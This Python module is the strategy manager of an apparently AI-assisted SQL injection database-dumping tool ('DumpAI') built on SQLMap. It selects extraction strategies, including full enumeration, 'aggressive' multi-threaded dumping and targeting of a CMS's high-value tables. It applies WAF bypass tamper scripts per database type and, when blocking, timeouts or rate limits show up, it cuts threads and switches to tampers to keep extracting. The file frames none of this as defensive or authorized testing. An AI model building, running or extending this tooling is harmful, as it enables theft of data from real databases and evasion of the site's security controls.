"""
DumpAI Strategy Manager - Adaptive Strategy Selection

Manages extraction strategies and adapts based on:
- Injection type (slow vs fast)
- WAF/IPS detection
- Error patterns
- AI recommendations
"""
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple
from enum import Enum

try:
    from .planner import Planner
    from .memory import Memory
except ImportError:
    from planner import Planner
    from memory import Memory


class Strategy(Enum):
    """Extraction strategies."""
    FULL_ENUMERATION = "full_enumeration"
    SMART_SEARCH = "smart_search"
    CMS_TARGETED = "cms_targeted"
    MINIMAL = "minimal"
    AGGRESSIVE = "aggressive"


@dataclass
class StrategyConfig:
    """Configuration for a strategy."""
    name: Strategy
    use_search: bool = False
    parallel: bool = True
    max_tables: int = 50
    max_rows: int = 0
    techniques: str = ""  # BEUSTQ
    threads: int = 2
    time_sec: int = 5
    tamper_scripts: List[str] = field(default_factory=list)
    
    def to_sqlmap_args(self) -> List[str]:
        """Convert to SQLMap command arguments."""
        args = []
        if self.techniques:
            args.append(f"--technique={self.techniques}")
        if self.threads:
            args.append(f"--threads={self.threads}")
        if self.time_sec:
            args.append(f"--time-sec={self.time_sec}")
        if self.tamper_scripts:
            args.append(f"--tamper={','.join(self.tamper_scripts)}")
        return args


STRATEGY_CONFIGS = {
    Strategy.FULL_ENUMERATION: StrategyConfig(
        name=Strategy.FULL_ENUMERATION,
        use_search=False,
        parallel=True,
        max_tables=100,
        threads=5
    ),
    Strategy.SMART_SEARCH: StrategyConfig(
        name=Strategy.SMART_SEARCH,
        use_search=True,
        parallel=True,
        max_tables=20,
        threads=2,
        time_sec=10
    ),
    Strategy.CMS_TARGETED: StrategyConfig(
        name=Strategy.CMS_TARGETED,
        use_search=False,
        parallel=True,
        max_tables=10,
        threads=3
    ),
    Strategy.MINIMAL: StrategyConfig(
        name=Strategy.MINIMAL,
        use_search=True,
        parallel=False,
        max_tables=5,
        threads=1,
        time_sec=15
    ),
    Strategy.AGGRESSIVE: StrategyConfig(
        name=Strategy.AGGRESSIVE,
        use_search=False,
        parallel=True,
        max_tables=200,
        threads=10,
        max_rows=1000
    )
}

WAF_TAMPERS = {
    "generic": ["space2comment", "between", "randomcase"],
    "mysql": ["space2mysqldash", "modsecurityversioned", "equaltolike"],
    "mssql": ["space2mssqlblank", "charencode"],
    "oracle": ["space2comment", "charencode"],
    "postgresql": ["space2comment", "between"]
}


class StrategyManager:
    """
    Manages extraction strategies with AI-driven adaptation.
    
    Responsibilities:
    1. Select initial strategy based on injection analysis
    2. Adapt strategy when errors occur
    3. Provide SQLMap parameters for current strategy
    4. Track strategy effectiveness
    """
    
    def __init__(self, planner: Planner, memory: Memory, verbose: bool = False):
        self.planner = planner
        self.memory = memory
        self.verbose = verbose
        
        self.current_strategy = Strategy.FULL_ENUMERATION
        self.current_config = STRATEGY_CONFIGS[self.current_strategy]
        
        self.waf_detected = False
        self.dbms = "mysql"
        self.error_count = 0
        self.success_count = 0
    
    def select_initial_strategy(self, injection_analysis: Dict) -> StrategyConfig:
        """
        Select strategy based on injection analysis.
        
        Args:
            injection_analysis: Result from Planner.analyze_injection()
        
        Returns:
            StrategyConfig for the selected strategy
        """
        is_slow = injection_analysis.get("is_slow", False)
        waf_detected = injection_analysis.get("waf_detected", False)
        self.dbms = injection_analysis.get("dbms", "mysql")
        self.waf_detected = waf_detected
        
        if is_slow:
            self.current_strategy = Strategy.SMART_SEARCH
            if self.verbose:
                print("[STRATEGY] Selected: SMART_SEARCH (slow injection)")
        elif waf_detected:
            self.current_strategy = Strategy.MINIMAL
            if self.verbose:
                print("[STRATEGY] Selected: MINIMAL (WAF detected)")
        else:
            self.current_strategy = Strategy.FULL_ENUMERATION
            if self.verbose:
                print("[STRATEGY] Selected: FULL_ENUMERATION (fast injection)")
        
        self.current_config = StrategyConfig(
            name=self.current_strategy,
            **{k: v for k, v in STRATEGY_CONFIGS[self.current_strategy].__dict__.items() 
               if k != 'name'}
        )
        
        if waf_detected:
            tampers = WAF_TAMPERS.get(self.dbms.lower(), WAF_TAMPERS["generic"])
            self.current_config.tamper_scripts = tampers[:2]
            if self.verbose:
                print(f"[STRATEGY] WAF bypass tampers: {self.current_config.tamper_scripts}")
        
        self.memory.log_strategy_change(
            old_strategy="none",
            new_strategy=self.current_strategy.value,
            reason=f"Initial: is_slow={is_slow}, waf={waf_detected}"
        )
        
        return self.current_config
    
    def adapt_to_cms(self, cms_name: str) -> StrategyConfig:
        """
        Adapt strategy when CMS is detected.
        
        CMS detection allows targeted extraction of known high-value tables.
        """
        old = self.current_strategy
        self.current_strategy = Strategy.CMS_TARGETED
        self.current_config = StrategyConfig(
            name=Strategy.CMS_TARGETED,
            **{k: v for k, v in STRATEGY_CONFIGS[Strategy.CMS_TARGETED].__dict__.items() 
               if k != 'name'}
        )
        
        if self.current_config.tamper_scripts == [] and self.waf_detected:
            tampers = WAF_TAMPERS.get(self.dbms.lower(), WAF_TAMPERS["generic"])
            self.current_config.tamper_scripts = tampers[:2]
        
        self.memory.log_strategy_change(
            old_strategy=old.value,
            new_strategy=self.current_strategy.value,
            reason=f"CMS detected: {cms_name}"
        )
        
        if self.verbose:
            print(f"[STRATEGY] Adapted to CMS: {cms_name}")
        
        return self.current_config
    
    def adapt_to_error(self, error: str, failed_tool: str) -> Tuple[StrategyConfig, Dict]:
        """
        Adapt strategy based on error.
        
        Returns:
            (new_config, adaptation_details)
        """
        self.error_count += 1
        adaptation = {}
        
        error_lower = error.lower()
        
        if any(x in error_lower for x in ["waf", "blocked", "forbidden", "mod_security"]):
            self.waf_detected = True
            adaptation["issue"] = "waf_detected"
            
            tampers = WAF_TAMPERS.get(self.dbms.lower(), WAF_TAMPERS["generic"])
            self.current_config.tamper_scripts = tampers
            self.current_config.threads = 1
            adaptation["tampers"] = tampers
            
        elif any(x in error_lower for x in ["timeout", "timed out", "connection"]):
            adaptation["issue"] = "timeout"
            self.current_config.time_sec = min(self.current_config.time_sec + 5, 30)
            self.current_config.threads = max(self.current_config.threads - 1, 1)
            adaptation["time_sec"] = self.current_config.time_sec
            
        elif "too many" in error_lower or "rate limit" in error_lower:
            adaptation["issue"] = "rate_limit"
            self.current_config.threads = 1
            self.current_config.parallel = False
            adaptation["threads"] = 1
        
        if self.error_count >= 3 and self.current_strategy != Strategy.MINIMAL:
            old = self.current_strategy
            self.current_strategy = Strategy.MINIMAL
            
            self.current_config = StrategyConfig(
                name=Strategy.MINIMAL,
                **{k: v for k, v in STRATEGY_CONFIGS[Strategy.MINIMAL].__dict__.items() 
                   if k != 'name'}
            )
            
            if self.waf_detected:
                tampers = WAF_TAMPERS.get(self.dbms.lower(), WAF_TAMPERS["generic"])
                self.current_config.tamper_scripts = tampers
            
            self.memory.log_strategy_change(
                old_strategy=old.value,
                new_strategy=self.current_strategy.value,
                reason=f"Too many errors ({self.error_count}): switching to MINIMAL"
            )
            
            adaptation["strategy_change"] = "MINIMAL"
        
        self.memory.add_issue(
            issue_type=adaptation.get("issue", "unknown"),
            description=error[:100],
            resolution=str(adaptation),
            resolved=False
        )
        
        if self.verbose:
            print(f"[STRATEGY] Adapted to error: {adaptation}")
        
        return self.current_config, adaptation
    
    def report_success(self):
        """Report successful operation."""
        self.success_count += 1
        
        if self.issue_log_has_unresolved():
            for issue in self.memory.issue_log:
                if not issue.get("resolved"):
                    issue["resolved"] = True
    
    def issue_log_has_unresolved(self) -> bool:
        """Check if there are unresolved issues."""
        return any(not i.get("resolved") for i in self.memory.issue_log)
    
    def get_sqlmap_args(self) -> List[str]:
        """Get SQLMap arguments for current strategy."""
        return self.current_config.to_sqlmap_args()
    
    def get_stats(self) -> Dict:
        """Get strategy statistics."""
        return {
            "current_strategy": self.current_strategy.value,
            "success_count": self.success_count,
            "error_count": self.error_count,
            "waf_detected": self.waf_detected,
            "tampers": self.current_config.tamper_scripts,
            "strategy_changes": len(self.memory.strategy_history)
        }
